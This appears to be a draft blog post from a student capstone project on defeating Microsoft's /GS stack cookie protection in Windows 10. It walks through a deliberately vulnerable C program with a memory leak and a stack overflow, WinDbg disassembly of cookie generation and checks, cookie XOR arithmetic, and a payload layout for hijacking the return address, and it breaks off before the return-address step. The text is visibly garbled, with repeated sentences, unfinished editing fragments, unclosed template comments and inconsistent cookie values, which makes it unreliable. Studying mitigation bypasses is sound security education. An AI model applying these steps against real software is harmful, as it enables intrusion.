This technique is popular in Windows exploits because there are many such commands at ﬁxed addresses in Kernel32.dll.These pairs can be used from almost any normal process.Because these are part of the kernel interface DLL,they are normally at ﬁxed addresses,which can be hardcoded.However,they probably differ between Windows versions,and may depend on which Service Pack is applied.

The amazing thing about overcoming mitigations is that there are ways to bypass it ... As with every known exploitation mitigation, there are ways to bypass it if certain conditions are met.  As with every known exploitation mitigation, there are ways to bypass it if certain conditions are met.

# Introduction

The purpose of this article is to demonstrate software exploitation on a modern Windows OS.  I was inspired to write this blog post while doing research for my senior capstone project on Windows mitigation techniques.  I realized there was a lack of up-to-date information on this subject so I thought it was a good idea to share some of the tools and methods I used in bypassing basic exploit mitigations to hopefully help other people in the same situation.

I was inspired to make this blog post after realizing/when I realized (the lack of information while) there was a lack of up-to-date information on this subject while doing research for my senior capstone project on Windows mitigation techniques.

This post came out rather long and is organized in the following way:  [Section 1] briefly discusses Windows mitigations, [Section 2] breaks down the implementation of Stack Cookie (GS) protection in vulnerable code and identifies some potential vulnerabilities towards the end, [Section 3] describes setting up the exploit, and [Section 4] puts all the pieces together and runs the final exploit.

[Section 2]: #vulnerability "GS vulnerability"
[Section 3]: #exploit-development
[Section 4]: #running-the-exploit

## Overview of Windows Mitigations

There are a number of software and hardware mitigations built-in to all newer versions of Windows.  Some of these protections include:

* Address Space Layout Randomization (ASLR) `/DYNAMICBASE` linker switch.  Randomizes where important data is stored in memory to help mitigate malware attacks based on (expected) code that is loaded to predictable or discoverable memory locations.
* Data Execution Prevention (DEP) `/NXCOMPAT` linker switch.  Marks pages of memory as non-executable using the No eXecute bit on modern CPUs to prevent (injected code from being run from those pages) the execution of injected code on those pages.  
DEP uses the No eXecute bit on modern CPUs to mark blocks of memory as read-only so that those blocks can’t be used to execute malicious code that may be inserted by means of a vulnerability exploit.
* Stack Cookies `/GS` compiler switch.  Prevents the successful exploitation of stack-based string buffer overflows.
* Structured Exception Handling (SEH)
   - Structured Exception Handling Overwrite Protection (SEHOP) is a run-time mechanism deployed on all apps to help prevent exploits that overwrite the Structured Exception Handler.  
   - Safeseh `/SAFESEH` linker switch
* Control-Flow Guard (CFG) `/guard` compiler and linker switch.  Combats the exploitation of memory corruption vulnerabilities by enforcing a program's intended control-flow. CFG is a mitigation tool that prevents calls to locations other than function entry points in your code. CFG can detect an attacker’s attempt to change the intended flow of code.

The focus of this post will be on bypassing Microsoft's Stack Cookie protection.  According to Microsoft docs [[1]],

>"/GS (Buffer Security Check) detects some buffer overruns that overwrite a function's return address, exception handler address, or certain types of parameters"

When `/GS` is enforced, a program generated master security cookie (4 bytes (dword), unsigned int) is initialized at startup and saved in the data section of memory.  
When enforced, the compiler allocates space for a 4 byte dword on the stack before the return address. On function entry, the allocated space is loaded with a program-wide security cookie that is computed once at module load. On function exit, and during frame unwinding on 64-bit operating systems, a helper function is called to make sure that the value of the cookie is still the same. A different value indicates that an overwrite of the stack may have occurred. If a different value is detected, the process is terminated.

When this happens,the return address is overwritten,allowing for arbitrary code to be executed.

The compiler performs security checks on GS buffers defined as an array larger than 4 bytes, a buffer that is not a pointer type, or a structure that is more than 8 bytes.  This also includes vulnerable function parameters include GS buffers, pointers, a C++ reference, or a structure that contains a pointer.

The /GS compiler option protects the following items: The return address of a function call. The address of an exception handler for a function. Vulnerable function parameters.

/GS attempts to detect buffer overruns into the return address. Buffer overruns are more easily exploited on platforms such as x86 and x64, which use calling conventions that store the return address of a function call on the stack.  
On x86, if a function uses an exception handler, the compiler injects a security cookie to protect the address of the exception handler.
/GS protects vulnerable parameters that are passed into a function. A vulnerable parameter is a pointer, a C++ reference, a C-structure (C++ POD type) that contains a pointer, or a GS buffer.

## Vulnerable Code

In this post, I'll demonstrate how to bypass Stack Cookie protection in Windows 10 using the below C source code `vuln.c`.  This code contains two simple yet realistic vulnerabilities which create the perfect conditions to launch this type of attack.  The first vulnerability appears in `leak()` that prints arbitrary memory addresses from an uninitialized array on the stack and the second is a stack-based buffer overflow vulnerability that allows an attacker to corrupt and hijack the return address of `overflow()`.  

In order to demonstrate how the stack cookie can be bypassed, we’ll use the following simple c++ code (basicbof.cpp) :

have a buffer overflow of either a return address

<samp>Sample output</samp>


```c
#include <stdio.h>
#include <string.h>
#define STDIN 0

void memleak(){
	char buf[64];
	int nr, i;
	unsigned int *value;
	value = (unsigned int*)buf;
	if( scanf("%d", &nr) == 0 ) {
		while( fflush( stdin ) != 0)
			;
	}
	for(i=0; i < nr; i++)
		printf("0x%08x ", value[i]);
}

void overflow() {
	char buf[1024];
	read(STDIN, buf, 2048);
}

void main(int argc, char* argv[]) {
	setbuf(stdout, NULL);
	printf("printf> ");
	memleak();
	printf("\nread> ");
	overflow();
	printf("\ndone.\n");
}
```
<figcaption>Figure:  Vulnerable target program. <code>vuln.c</code> source code</figcaption>

The line `read(STDIN, buf, 2048)` in `overflow()` will overflow if more than 1024 bytes are read into character array `buf[1024]`.  Because the C library function `read()` does not enforce buffer size restrictions, we can write past `buf`'s allocated region in memory and corrupt the adjacent stack contents.  This potentially overwrites important control values stored on the stack.

By leveraging this vulnerability, we can write an exploit to overwrite the saved return address on the stack with an address that points to an area in memory that we control.  The address that contains our malicious payload will be obtained from the memory leak in `leak()` to guarantee a stable address despite ASLR.

### Setup

Everything here was run on my personal laptop which is host to a Windows 10 64-bit OS (version 1709 build 16299.492).  I compiled all source code using Visual Studio 2015 Build Tools and the x86 Native Tools Command Prompt for x86 output files.  It's my personal preference to write code in a text editor and then compile in a terminal, but the Visual Studio IDE can be easily substituted.

First, the code is compiled with the below command in one of the VS command prompts:

```console
C:\blog> cl /Zi vuln.c /link /NXCOMPAT:NO
```

This produces `vuln.exe`, a 32-bit PE file format executable with debugging information (`/Zi`).  Note that `/NXCOMPAT:NO` disables Data Execution Prevention (DEP) in the linker.  In this post I focus on bypassing ASLR and Stack Cookies.  My next post [Part 2: Bypassing DEP!]({{ site.baseurl }}{% link _posts/2018-06-02-bypass1.md %}) will build on the exploit in this post and show how to bypass DEP.  Because Stack Cookie (`/GS`) protection is enabled by default in Windows, we do not need to explicitly pass any options to the compiler.

Running the program will prompt the user for input from the keyboard.  The first `echo> ` requires an integer and the second `read> ` prompts for arbitrary text.

# Vulnerability

## Reversing MSVC Security Cookie /GS

Stack cookie protection debugging & demonstration

Going straight to the disassembly is the best way to concretely understand the implementation, especially if one is in search of weaknesses.

The implementation of stack cookies vary by compiler and OS.  In Linux systems for example, the stack cookie is called a stack canary and is controlled through the GCC compiler switch `-fstack-protector`.

The general concept among these variations place a sentinel value on the stack between local buffers and the frame's return address.  This sentinel is used as a marker to detect stack corruption before a function returns.  The approaches taken to generate cookies vary quite substantially, some having more implications than others.
Implementation can generally be summed up in three steps: cookie initialization and generation, prologue code insertion, and epilogue code insertion.  Step 1 tends to vary the most across implementations.

As was mentioned in the introduction, security solutions that are designed to protect against stack-based buffer overflows through the use of cookies tend to involve three distinct steps: cookie generation, prologue modifications, and epilogue modifications.

This chapter will describe each of these three steps independent of one another to paint a picture for how GS operates.

Before strategizing a bypass method, we need to get a better idea on how the cookie is implemented in our program.  Loading the program `vuln.exe` in a debugger like Windbg demonstrates some cookie behavior.  The following command in Windbg shows all symbols (variables, function names, etc.) related to the cookie.  This is a good place to start especially if you have no idea how the cookie is used in Windows.

```nasm
0:000> x vuln!*cookie*
00f6e02c    vuln!__security_cookie_complement = 0x44bf19b1
00f6e030    vuln!__security_cookie = 0x9f966cbc
00f075b8    vuln!__security_check_cookie (unsigned int)
00f088b0    vuln!ValidateLocalCookies (struct _EH4_SCOPETABLE *, char *)
00f08181    vuln!__security_init_cookie (void)
```

To view the disassembly of a function, use `uf [function_name]` where function_name is represented in the form `module_name!function_name`.  In this case: `uf vuln!vuln` (both module and function names are `vuln`).

In WinDbg, all symbol names are referenced with the convention: `module_name!func_or_var_name` where module name is the name of the program in this instance.

The above output provides a lot of useful information including the memory addresses of each symbol.  We can use this information to set breakpoints, search memory, or view disassembly.  This also tells us that the program cookie is stored in a variable named `vuln!__security_cookie`, the security check function that verifies the cookie is called `vuln!__security_check_cookie()` and the initialization function is named `vuln!__security_init_cookie()`.


### Initializing the Security Cookie / Cookie Generation

When `/GS` is enforced, a program generated master security cookie (4 bytes (dword), unsigned int) is initialized at startup and saved in the data section of memory.  

Microsoft’s GS protection uses a pseudo-random XOR'd security cookie that is generated from multiple data sources in the program.

The security cookie is initialized on entry to an EXE or DLL.  The initialization routine to generate the cookie `__security_init_cookie()` is invoked once at program startup in the function `mainCRTStartup()` and is stored as a global value in the .data section of program memory.  Disassembling this function shows how the program cookie is generated.  This insight will factor in to choosing a bypass method later on.

The function `mainCRTStartup()` specifies the entry point address for our .exe file.  This corresponds to `void main()` in the source code.  We can use the command `uf` in WinDbg to print a functions disassembly.

The guts of the `__security_init_cookie` routine are actually the most critical part to understand. At a high-level, this routine will take an XOR'd combination of the current system time, process identifier, thread identifier, tick count, and performance counter. The end result of XOR'ing these values together is what ends up being the image file's security cookie. To understand how this actually works in more detail, consider the following disassembly from an application compiled with version 14.00.50727.42 of Microsoft's compiler. Going straight to the disassembly is the best way to concretely understand the implementation, especially if one is in search of weaknesses.

```nasm
0:000> uf vuln!mainCRTStartup
; ... (snipped)
vuln!mainCRTStartup:
00f078d7 e83cb6ffff      call    vuln!ILT+7955(___security_init_cookie) (00f02f18)
00f078dc e9e5fdffff      jmp     vuln!__scrt_common_main_seh (00f076c6)  Branch
```

A lot of the output is snipped for brevity, but we can see the call to the initialization routine above.  

The real nuts and bolts of GS cookie generation is found in the disassembly of `___security_init_cookie()`.  Disassembling the initialization function /routine in Windbg reveals some important implementation details / internals.

```nasm
0:000> uf vuln!__security_init_cookie
; ... (snipped)
vuln!__security_init_cookie+0x30:
00f081b1 8d45f4          lea     eax,[ebp-0Ch]
00f081b4 50              push    eax
00f081b5 ff152010f700    call    dword ptr [vuln!_imp__GetSystemTimeAsFileTime (00f71020)]
00f081bb 8b45f8          mov     eax,dword ptr [ebp-8]
00f081be 3345f4          xor     eax,dword ptr [ebp-0Ch]
00f081c1 8945fc          mov     dword ptr [ebp-4],eax
00f081c4 ff151c10f700    call    dword ptr [vuln!_imp__GetCurrentThreadId (00f7101c)]
00f081ca 3145fc          xor     dword ptr [ebp-4],eax
00f081cd ff151810f700    call    dword ptr [vuln!_imp__GetCurrentProcessId (00f71018)]
00f081d3 3145fc          xor     dword ptr [ebp-4],eax
00f081d6 8d45ec          lea     eax,[ebp-14h]
00f081d9 50              push    eax
00f081da ff151410f700    call    dword ptr [vuln!_imp__QueryPerformanceCounter (00f71014)]
00f081e0 8b4df0          mov     ecx,dword ptr [ebp-10h]
00f081e3 8d45fc          lea     eax,[ebp-4]
00f081e6 334dec          xor     ecx,dword ptr [ebp-14h]
00f081e9 334dfc          xor     ecx,dword ptr [ebp-4]
00f081ec 33c8            xor     ecx,eax
00f081ee 3bcf            cmp     ecx,edi
00f081f0 7507            jne     vuln!__security_init_cookie+0x78 (00f081f9)
```

The current tick count is queried using GetTickCount and then XOR'd as the fourth component of the cookie.
Like system time, this value is also a 64-bit integer, and its high order 32-bit integer and low order 32-bit integer are XOR'd as the fifth component of the cookie.

The above disassembly shows that the random cookie is generated by XORing the result of four different functions: `GetSystemTimeAsFileTime()`, `GetCurrentThreadId()`, `GetCurrentProcessId()`, and `QueryPerformanceCounter()`.

The first three functions are straightforward.   `GetSystemTimeAsFileTime()` retrieves the current system date and time and XOR's the high order 32-bit integer with the low order 32-bits, `GetCurrentThreadId()` retrieves the thread identifier of the calling thread, and `GetCurrentProcessId()` retrieves the process identifier of the calling process.  It would be pretty reasonable to guess or brute-force these three values as they are not generated so randomly.  Sources of low entropy.

The last function `QueryPerformanceCounter()` retrieves the current value of the performance counter.  based on a hardware counter that can't be synchronized to an external time reference with a resolution of 1 microsecond.

The result of XOR'ing these four sources together is the program-wide cookie.  After, a few checks are done to ensure a valid cookie has been generated then it's stored in the variable `__security_cookie` along with it's bit-wise complement in `__security_cookie_complement`.

```nasm
vuln!__security_init_cookie+0x88:
00f08209 890d30e0f600    mov     dword ptr [vuln!__security_cookie (00f6e030)],ecx
00f0820f f7d1            not     ecx
00f08211 890d2ce0f600    mov     dword ptr [vuln!__security_cookie_complement (00f6e02c)],ecx
00f08217 5f              pop     edi
00f08218 5e              pop     esi
00f08219 8be5            mov     esp,ebp
00f0821b 5d              pop     ebp
00f0821c c3              ret
```

The approximate complexity of brute-forcing a cookie is 2^21 to 2^23
The first too are generated not so randomly (check PIDs in Task Manager). The other 3 are timers.  If exploiting something locally, timers can be determined pretty acurately, if exploiting remotely, it’s not that easy. As the process being exploited will raise an error if you don’t know the right value, and as the precision for QueryPerformanceCounter() is really high, bruteforcing is not that straight forward.
We haven’t thoroughly tested the randomness of the security cookies, but our first attempts show that 21 to 23 bits need to be bruteforced out of the 32. We know timers are not a good random source, for example, given two consecutives values is easy to predict the next, however, we are not sure if this is enough to successfully exploit programs protected with Microsoft’s /GS option.


right before the saved EBP and EIP.
[buffer][cookie][saved EBP][saved EIP]

The cookie is initialized using a combination of routines: `GetSystemTimeAsFileTime`, `GetCurrentThreadId`, `GetCurrentProcessId`, and `QueryPerformanceCounter`.  This ensures the value will be random and difficult to guess or reproduce.  While the first three functions are simple enough to guess,

In simpler terms, the meat of the cookie generation can basically be summarized through the following pseudo code:

Cookie  = SystemTimeHigh
Cookie ^= SystemTimeLow
Cookie ^= ProcessId
Cookie ^= ThreadId
Cookie ^= TickCount
Cookie ^= PerformanceCounterHigh
Cookie ^= PerformanceCounterLow

### Prologue and Epilogue

In short : a security cookie is added to the stack and is compared again before the function returns

The compiler inserts code in each vulnerable function to enforce the validity of the cookie before processing the return address at runtime.  A vulnerable function contains a GS buffer or vulnerable function parameter as discussed [earlier].

[earlier]: #overview-of-windows-mitigations "overview"

In this section, I'll show the prologue and epilogue of a vulnerable function compiled with GS using the disassembly of `overflow()` as an example.

In the function prologue, three lines of assembly code are inserted by the compiler which are commented below.  After the stack allocates space for local variables, a copy of the program cookie `__security_cookie` is stored in `eax`.  Next, a logical XOR of the cookie with the address of `ebp` is stored on the stack in `[ebp-4]`.  This location is between the local variables and the return address.  (located after local variables and before the saved EIP. directly below the return address)

```nasm
0:000> uf vuln!overflow
vuln!overflow:
;  Normal entry routine
00f073a0 55              push    ebp
00f073a1 8bec            mov     ebp,esp
00f073a3 81ec04040000    sub     esp,404h
;  Compiler added GS support
00f073a9 a130e0f600      mov     eax,dword ptr [vuln!__security_cookie (00f6e030)]
00f073ae 33c5            xor     eax,ebp
00f073b0 8945fc          mov     dword ptr [ebp-4],eax
```

The function epilogue tells a similar story.  Three lines of assembly code are inserted right before the function returns.  The first line retrieves (the stack's copy of the cookie from) a copy of the stack cookie from `[ebp-4]` then performs a second XOR with the address in `ebp` revealing the original security cookie.  Lastly, a call to `__security_check_cookie()` verifies the cookie.

```nasm
;  Compiler added GS support
00f073c9 8b4dfc          mov     ecx,dword ptr [ebp-4]
00f073cc 33cd            xor     ecx,ebp
00f073ce e83ac1ffff      call    vuln!ILT+9480(__security_check_cookie (00f0350d)
;  Normal exit routine
00f073d3 8be5            mov     esp,ebp
00f073d5 5d              pop     ebp
00f073d6 c3              ret
```

The security check function compares the stack's cookie in `ecx` with the program-wide master cookie in `__security_cookie`.  If the comparison passes, control jumps to line `__security_check_cookie+0x9` and execution continues normally in `overflow()`.  If it fails,  then control jumps to `__security_check_cookie+0xb` where the failure function is invoked `___report_gsfailure` and the program terminates early.

At this point, the compiler can detect a buffer overflow attack.  Since the vulnerable call to `read()` will result in overwriting the stack cookie in the location `[ebp-4]`, ecx will contain the incorrect value and the check will fail.

```nasm
0:000> uf vuln!__security_check_cookie
vuln!__security_check_cookie:
;  Compare local stack cookie with program-wide cookie
00f075b8 3b0d30e0f600    cmp     ecx,dword ptr [vuln!__security_cookie (00f6e030)]
;  If not equal, jump to GS failure routine
00f075be f27502          bnd jne vuln!__security_check_cookie+0xb (00f075c3)  Branch

vuln!__security_check_cookie+0x9:
;  Otherwise, if equal, return to next instruction in calling function
00f075c1 f2c3            bnd ret  Branch

vuln!__security_check_cookie+0xb:
00f075c3 f2e99fc3ffff    bnd jmp vuln!ILT+10595(___report_gsfailure) (00f03968)  Branch
```

#### Example of Stack Corruption

So, what happens in a stack-based buffer overflow when GS is enforced?

Below is a visual representation of the runtime stack in `vuln.exe` labeled with offsets to the base pointer `ebp`.

The overwritten stack on the right demonstrates what happens in memory during a typical buffer overflow attack that attempts to overwrite the return address.  The attacker-controlled data (represented by "AAAAA...") is written starting at the address of `buf` and continues downward toward higher addresses corrupting `overflow()`'s stack frame.  Data larger than 1024 bytes will overflow `buf` and immediately overwrite the adjacent memory contents.

<a href="{{ site.baseurl }}/images/vuln-stack.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/vuln-stack.PNG">
</a>

As illustrated, the attempt to overwrite the saved EIP also overwrites the cookie.  When the security check function runs at the end of `overflow()`, it will notice that the local copy of the cookie stored on the stack in `ebp-4` has been overwritten and will terminate execution.

---

This behavior can also be confirmed in a debugger by setting a breakpoint on the call to the check function at the end of `overflow()`.

```console
0:000> bu 00f073ce
0:000> bl
     0 e Disable Clear  00f073ce     0001 (0001)  0:**** vuln!overflow+0x2e
```

Run the program with go (`g` in WinDbg) and provide the console with at least 1028 bytes of input when prompted.  The program will pause right before the security check function executes.

```console
0:000> g
Breakpoint 0 hit
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f073ce esp=012ff3a0 ebp=012ff7a4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!vuln+0x2e:
00f073ce e83ac1ffff      call    vuln!ILT+9480(__security_check_cookie (00f0350d)

```

Looking at the memory location that stores the copy of the cookie confirms that we have overwritten the GS cookie with `41414141` (AAAA).

## Stack cookie /GS bypass methods

At this point, we have enough information on the implementation and behavior of GS in our vulnerable program.  We know the algorithm and data sources used to generate the program-wide cookie at startup and how to calculate and store the cookie in the vulnerable function at runtime.

A successful exploit is dependent on **passing or avoiding** the security check that takes place at the end of a vulnerable function.  To pass the check, the copy of the cookie on the stack must match the program-wide master cookie by the end of the function.

I'll present a technique for passing the security check by obtaining the value of the cookie at runtime and (overwrite the cookie with the same value in your buffer) overwriting the (copy on the stack) copy of the stack's cookie with the same value in our exploit buffer.  This will trick the security check function into thinking there has been no corruption for the duration of `overflow()` and allow for our malicious payload to run.

Bypass by replacing cookie on stack,

Given the right conditions, it also stands to reason that if an attacker can trigger an exploitable condition and gain control before the cookie is checked, GS protection can be avoided completely. the attacker can avoid GS protection completely.  Diverting execution before the security check means that the check will never be performed.

then it stands that the cookie will provide no protection. One example of this might include diverting execution to malicious code by overwriting a function pointer that is called prior to returning from the function.  At the moment I can't provide any specific examples, but I'll add it to my to-do list or perhaps try it myself!

Despite being written 10 years ago, [Corelan's article](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/) on bypassing stack cookies provides an excellent summary on the topic.  The main technique described avoids the security check by overwriting an application-specific exception handler structure to trigger an exception before the cookie is checked.  Unfortunately, most of the techniques in the article are no longer possible on newer releases of Visual Studio as Microsoft has expanded GS to protect the address of exception handlers, additional GS buffers, and function parameters.  MS also introduced SEHOP and SafeSEH to prevent exploitation of SEH overwrites.  Either way, I felt obligated to point out that other bypass techniques have been reported by reputable researchers.

In the remainder of this post I will model an exploit for method 2 bypassing by replacing cookie on stack. simply put this value on the stack during the overwrite

{% comment %}
These include: Bypass using application specific exception handling,Locate code with unprotected buffers, Bypass by overwriting stack data in functions up the stack, Bypass by guessing the cookie, or Bypass because the cookie is static.  

For example, David Litchfield pointed out that even though stack cookies are present, it may still be possible to overwrite exception registration records on the stack which may be called before the function actually returns. This discovery was one of the reasons that Microsoft later introduced SafeSEH (which had its own set of issues)[6].

Summary of bypass methods (based on Corelan's excellent article)
1. Bypass using Exception Handling
So, we can defeat stack protection by triggering an exception before the cookie is checked during the epilogue (or we can try to overwrite other data (parameters that are pushed onto the stack to the vulnerable function), which is referenced before the cookie check is performed.), and then deal with possible SEH protection mechanisms, if any… Of course, this second technique only works if the code is written to actually reference this data. You can try to abuse this by writing beyond the end of the stack.

The key in this scenario is that you need to overwrite far enough, and that there is an application specific exception registered (which gets overwritten). If you can control the exception handler address (in the Exception_Registration structure), then you can try to overwrite the pointer with an address that sits outside the address range of a loaded module. After all, SEH records on the stack are not protected by GS… you only have to bypass SafeSEH.

2. Bypass by replacing cookie on stack and in .data section
Another technique to bypass stack cookie protection is by replacing this authoritative cookie value in the .data section of the module (which is writeable, otherwise the applicaiton would not be able to calculate a new cookie and store it at runtime), and replace the cookie in the stack with the same value. This technique is only possible if you have the ability to write anything at any location. (4 byte artbitrary write) – access violations that state something like the instruction below indicate a possible 4 byte arbitrary write :
mov dword ptr[reg1], reg2
(In order to make this work, you obviously need to be able to control the contents of reg1 and reg2). reg1 should then contain the memory location where you want to write, and reg2 should contain the value you want to write at that address.

3. Bypass because not all buffers are protected
Another exploit opportunity arises when the vulnerable code does not contains string buffers (because there will not be a stack cookie then) This is also valid for arrays of integers or pointers.
[buffer][cookie][EH record][saved ebp][saved eip][arguments ]
Example : If the “arguments” don’t contain pointers or string buffers, then you may be able to overwrite these arguments and take advantage of the fact that the functions are not GS protected.

4. Bypass by overwriting stack data in functions up the stack
When pointers to objects or structures are passed to functions, and these objects or structures resided on the stack of their callers (parent function), then this could lead to GS cookie bypass. (overwrite object and vtable pointer. If you point this pointer to a fake vtable, you can redirect the virtual function call and execute your evil code)

5. Bypass because you can guess/calculate the cookie
Reducing the Effective Entropy of GS Cookies

6. Bypass because the cookie is static
Finally, if the cookie value appears to be the same/static every time, then you can simply put this value on the stack during the overwrite.

According to Wikipedia [2],

[2]: https://en.wikipedia.org/wiki/Buffer_overflow_protection#Random_XOR_canaries

>Random XOR canaries have the same vulnerabilities as random canaries, except that the "read from stack" method of getting the canary is a bit more complicated. The attacker must get the canary, the algorithm, and the control data to generate the original canary for re-encoding into the canary needed to spoof the protection.

Based on this logic, we know the algorithm and the control data to generate the original canary.  The missing piece is to get the canary at runtime. To get the canary we can use the memory leak.

# Exploit Development

## Overview

{% comment %}
Opening the vulnerable program in a debugger and setting a breakpoint on this line, we can directly access the cookie's value by analyzing the memory at the cookie's address `0x0133c030`.

When returning directly to the stack, finding a return address simply involves examining the debugger’s stack window when EIP is overwritten in order to find a stack address that is suitable for use.

Windows stack addresses are usually not predictable
Executable and library addresses are predictable
System libraries are often static between patch levels
Application libraries change even less frequently
Executable addresses only change between app versions

The cookie that was generated for the image file is XOR'd with the current value of the frame pointer. This value is then placed in the current stack frame at a precisely chosen location by the compiler.
{% endcomment %}

We can simply leverage the memory leak vulnerability in `memleak()` to obtain the stack cookie's value and embed it in the payload to bypass the security cookie check.

There are two things to consider when constructing a payload that replaces the cookie with the correct value.  

First, we need to ensure proper placement of the cookie in our payload so it aligns to the correct location in the runtime stack.  [As previously discussed], the copy of the stack's cookie is saved in `ebp-4` and used at the end in the security check comparison.  Our exploit must be set up in the following way to ensure proper alignment with the location `ebp-4` at runtime:

[As previously discussed]: #prologue-and-epilogue "prologue and epilogue"

<a href="{{ site.baseurl }}/images/exploit-payload.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/exploit-payload.PNG">
</a>[diagram](#diagram)

{% comment %}
```console
[       buf       ][  ebp-4  ][   ebp   ][   eip   ][  nops  ][  shellcode  ]
```
{% endcomment %}

Shown above is the high-level construction of our payload along with the number of bytes required for precise alignment.  According to this diagram, 1028 bytes overwrite the stack cookie, 1032 overwrite ebp, and 1036 to overwrite the return address.  The number of bytes for `nops` and `shellcode` is arbitrary up to the `read()` limit of 2048 bytes total.  After the buffer and registers are filled, there are 1012 remaining bytes available for `nops` and `shellcode`.  In my experience, it's fine if some of this space is not used and may take some experimentation to figure out how many bytes to use for each.

Second, we need to obtain the correct value to write in our payload at `ebp-4`.  There are a number of ways to view the cookie's value in Windbg.  The first is by setting a program breakpoint on the fourth line in `overflow()`'s prologue when the program-wide cookie is copied to the stack in `eax`.

```

vuln!overflow+0x9:
00fd73a9 a130e00301      mov     eax,dword ptr [vuln!__security_cookie (0103e030)] ds:002b:0103e030=80ded670
```

When the program hits the breakpoint, it prints the address and value of the cookie on the last line: `ds:002b:0103e030=80ded670`.  Alternatively, we can directly access the cookie's value by analyzing the memory at the cookie's address `0x0103e030`.

```
0:000> dd 0103e030 L1
0103e030  80ded670
```

Or analyzing memory at the symbol `vuln!__security_cookie`.

```
0:000> dd vuln!__security_cookie L1
0103e030  80ded670
```

Either way, we end up with the same value: `0x80ded670`.  This is the program-wide master cookie.

Next the cookie will be XOR'd with the current value of the frame pointer and stored on the stack.  We use the debugger again to show the value pointed to by ebp.

```
0:000> r ebp
ebp=00affeb0
```

The ebp register points to `0x00affeb0`.  We complete the algorithm by performing the following computation.

$$\mathtt{0x80ded670}\ \oplus\ \mathtt{0x00affeb0}\ \Rightarrow\ \mathtt{0x807128c0}$$

The result `0x807128c0` is stored on the stack in `ebp-4` for the duration of the function until it is XOR'd again and compared to the master cookie before processing the return address.

This value can also be obtained by stepping through the debugger until after the XOR instruction and checking the contents of `eax`.

```
0:000> r eax
eax=807128c0
```

This is the value we'll need to write in our exploit to pass the comparison check.

### Leveraging `memleak()` vulnerability

Luckily, `vuln.exe` makes a call to `memleak()` first, before `overflow()`, that leaks stack pointers from its current stack frame.

Until now, I haven't discussed the significance of the memory leak that takes place prior to `overflow()` in `memleak()`.  As it turns out, the value we need to bypass the security check is printed in the leaked stack addresses.  Because the cookie is stored on the stack in the prologue and the program generates one cookie per invocation, we can use the cookie in `memleak()` to bypass the security check in `overflow()`.

Since the leak prints arbitrary addresses from the stack and the security cookie is stored on the stack in the prologue, we can bet that the cookie appears somewhere in the leaked output.

Below is the output from running the program in the debugger.  The value provided to `printf>` controls a loop counter that prints 8-byte addresses from the stack (i.e. 40 will print 40 addresses and so on).  In the leaked output, I've circled the **17th address** which contains the XOR'd cookie needed to bypass GS protection `0x807128c0`.  Although this location may differ on other computers, it only takes a few minutes to figure out by comparing the output to the values in the debugger.

<a href="{{ site.baseurl }}/images/printf.jpg">
<img class="img-center" src="{{ site.baseurl }}/images/printf.jpg">
</a>

To prove this value will circumvent the security check function, we perform the second XOR operation below to show that it results in the original program-wide cookie.

$$\mathtt{0x807128c0}\ \oplus\ \mathtt{0x00affeb0}\ \Rightarrow\ \mathtt{0x80ded670}$$

When `__security_check_cookie()` runs, the comparison will succeed and will transfer control back to `overflow()` where our malicious code is waiting to be run.  This proves that we can use this method to bypass stack cookie (GS) mitigation.

Leveraging the memory leak that prints arbitrary addresses from the stack, we notice that the value needed to overwrite [ebp-4] (in the above example case `0x87fc2d95`) is located at the 17th address in our leaked output.  Using the Python exploit from stage 1, we are able to capture this value from the program output and use it as input to our payload.   

## Writing the Exploit

The important control values in the exploit buffer are the stack cookie and saved return address.  The stack cookie will be replaced with the correct value from `memleak()` explained in the [previous section] and the value to overwrite the saved return address will be explained in the [next section].

[previous section]: #leveraging-memleak-vulnerability "leveraging memleak vulnerability"
[next section]: #finding-return-address "finding return address"

```
[       buf       ][  ebp-4  ][   ebp   ][   eip   ][  nops  ][  shellcode  ]
```

One of the challenges I faced writing this exploit was figuring out how to interact with the vulnerable program.  The program accepts user input through STDIN twice &mdash; in `memleak()` and again in `overflow()`.  

Ideally, we need to invoke `vuln.exe`, obtain the values we need from the `memleak()` output, craft the payload with the correct values and send it back to `overflow()` all in the *same* invocation.  To pull this off, we'll need a way to pause the program after `memleak()` prints so we have enough time to calculate and construct the exploit.

{% comment %}
capture the output from `memleak()` to use in the payload, construct the payload with the correct values, and send the payload back to `overflow()` all in the *same* invocation.  Since the program generates a new cookie each execution, we only have one shot to create and send the correct payload.  So, after `memleak()` prints, we need a way to pause the program while we construct the exploit.

we need to somehow pause the program, obtain the values we need from the output of the running program, and then craft the payload.
{% endcomment %}

Luckily, the flexibility of Python's `subprocess` module allows us to interact with the program in this way.  We can spawn new processes and connect to their input/output/error pipes using the underlying `Popen` interface ([more on this later]). interactive
This gives us the desired control we need over the program's execution.

[more on this later]: #running-the-exploit

### Stack-based Buffer Overflow

After replacing the cookie with the correct value in the payload, we are left with a typical buffer overflow vulnerability that we can proceed to trigger as usual.  Sending a large string of repeating ASCII characters allows us to easily track how our input affects memory of a running process.  At the time the program crashes, we can search for registers and stack memory overwritten with the ASCII representation `0x41` to `0x44`.

I created a simple script to send the below payload to `vuln.exe` and allowed it to crash in the debugger.  Each group of ASCII characters act as a 4-byte placeholder for the real values we'll plug in later where "BBBB" = the base pointer, "CCCC" = instruction pointer, and "DDDD" = the nopsled + shellcode.  We hope to control the crash and overwrite EIP with exactly `0x43434343` (CCCC).

```
[ AAAAAAAA...1024 ][  cookie  ][   BBBB   ][   CCCC   ][   DDDD    ]
```

 The crash triggers WinDbg as its postportem debugger and prints the last instruction executed along with the current register values.  WinDbg displays the following information at the time of the crash (click photo to expand details).

<a href="{{ site.baseurl }}/images/windbg.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/windbg.PNG">
</a>

Looking at the CPU registers on the left, EBP is overwritten with `0x42424242` (BBBB) and EIP is overwritten with `0x43434343` (CCCC) as expected.  This confirms we have gained control over the Instruction Pointer (EIP) at offset 1032 in the payload.  

The crash is caused by an `Access violation` error when the program attempts to read or access an invalid instruction pointer address.  The command window on the right shows the instruction pointer at the time of the fault is `0x43434343`.  We can fix this error by overwriting the IP with a valid address that exists in one of the loaded modules.

#### Finding Return Address

